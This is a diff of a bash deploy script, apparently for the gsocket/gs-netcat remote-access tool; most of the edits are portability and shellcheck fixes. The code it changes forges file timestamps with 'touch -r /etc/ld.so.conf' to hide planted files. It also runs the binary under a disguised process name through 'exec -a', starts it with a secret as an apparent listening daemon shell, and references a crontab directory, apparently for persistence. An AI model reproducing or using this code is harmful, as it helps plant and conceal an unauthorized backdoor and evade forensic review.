@@ -66,6 +66,11 @@ CDR="\033[0;31m" # red
 CC="\033[1;36m" # cyan
 CM="\033[1;35m" # magenta
 CN="\033[0m"    # none
+CW="\033[1;37m"
+
+# arr=()
+# arr+=("-r" "/etc/foobar.txt")
+# echo touch "${arr[@]}"
 
 if [[ -z "$GS_DEBUG" ]]; then
 	DEBUGF(){ :;}
@@ -78,8 +83,11 @@ _ts_fix()
 	local fn
 	local ts
 	local args
+	local ax
 	fn="$1"
 	ts="$2"
+
+	args=() #OSX, must init or " " in touch " " -r 
 
 	[[ ! -e "$1" ]] && return
 	[[ -z $ts ]] && return
@@ -90,12 +98,15 @@ _ts_fix()
 	# Either reference by Timestamp or File
 	[[ "${ts:0:1}" = '/' ]] && {
 		[[ ! -e "${ts}" ]] && ts="/etc/ld.so.conf"
-		touch "${args[@]}" -r "${ts}" "$fn" 2>/dev/null
+		ax=("${args[@]}" "-r" "$ts" "$fn")
+		touch "${ax[@]}" 2>/dev/null
 		return
 	}
-	touch "${args[@]}" -t "$ts" "$fn" 2>/dev/null && return
+	ax=("${args[@]}" "-t" "$ts" "$fn")
+	touch "${ax[@]}" 2>/dev/null && return
 	# If 'date -r' or 'touch -t' failed:
-	touch "${args[@]}" -r "/etc/ld.so.conf" "$fn" 2>/dev/null
+	ax=("${args[@]}" "-r" "/etc/ld.so.conf" "$fn")
+	touch "${ax[@]}" 2>/dev/null
 }
 
 # Restore timestamp of files
@@ -125,7 +136,7 @@ ts_restore()
 		[[ $n -eq "${#_ts_systemd_ts_a[@]}" ]] && break
 		ts="${_ts_systemd_ts_a[$n]}"
 		fn="${_ts_systemd_fn_a[$n]}"
-		DEBUGF "RESTORE-LAST-TS ${fn} ${ts}"
+		# DEBUGF "RESTORE-LAST-TS ${fn} ${ts}"
 		((n++))
 
 		_ts_fix "$fn" "$ts" "symlink"
@@ -247,9 +258,10 @@ mk_file()
 			[[ -n "$pdir_added" ]] && {
 				# Remove pdir if it was added above
 				# Bash <5.0 does not support arr[-1]
-				unset _ts_ts_a[${#_ts_ts_a[@]}-1]
-				unset _ts_fn_a[${#_ts_fn_a[@]}-1]
-				unset _ts_mkdir_fn_a[${#_ts_mkdir_fn_a[@]}-1]
+				# Quote (") to silence shellcheck
+				unset "_ts_ts_a[${#_ts_ts_a[@]}-1]"
+				unset "_ts_fn_a[${#_ts_fn_a[@]}-1]"
+				unset "_ts_mkdir_fn_a[${#_ts_mkdir_fn_a[@]}-1]"
 			}
 			return 69 # False
 		}
@@ -304,7 +316,6 @@ xmkdir()
 {
 	local fn
 	local pdir
-	local fn_dir
 	fn="$1"
 
 	DEBUGF "${CG}XMKDIR($fn)${CN}"
@@ -609,6 +620,9 @@ init_vars()
 	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
 	local pids
 	pids="$(pgrep "${BIN_HIDDEN_NAME}" 2>/dev/null)"
+	# OSX's pgrep works on argv[0] proc-name
+	[[ -z $pids ]] && pids="$(pgrep "${PROC_HIDDEN_NAME//[^[:alnum:]]}" 2>/dev/null)"
+
 	[[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }" # Convert multi line into single line
 
 	DEBUGF "OLD_PIDS='$OLD_PIDS'"
@@ -1373,8 +1387,8 @@ gs_start()
 			# HERE: sec.dat has been updated
 			OK_OUT
 			WARN "More than one ${PROC_HIDDEN_NAME} is running."
-			echo -e 1>&2 "----> You may want to check: ${CM}ps -elf|grep -F -- '${PROC_HIDDEN_NAME}'${CN}"
-			[[ -n $OLD_PIDS ]] && echo -e 1>&2 "----> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
+			echo -e 1>&2 "--> You may want to check: ${CM}ps -elf|grep -F -- '${PROC_HIDDEN_NAME}'${CN}"
+			[[ -n $OLD_PIDS ]] && echo -e 1>&2 "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
 		fi
 	else
 		OK_OUT ""
@@ -1387,7 +1401,7 @@ gs_start()
 		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
 		# This does work:
 		#     FOO="X=1" && (eval $FOO id)
-		(cd $HOME; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
+		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
 		IS_GS_RUNNING=1
 	fi
 }
@@ -1461,5 +1475,7 @@ if [[ -n "$GS_NOSTART" ]]; then
 else
 	gs_start
 fi
+
+echo -e 2>&2 "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
 
 exit_code 0
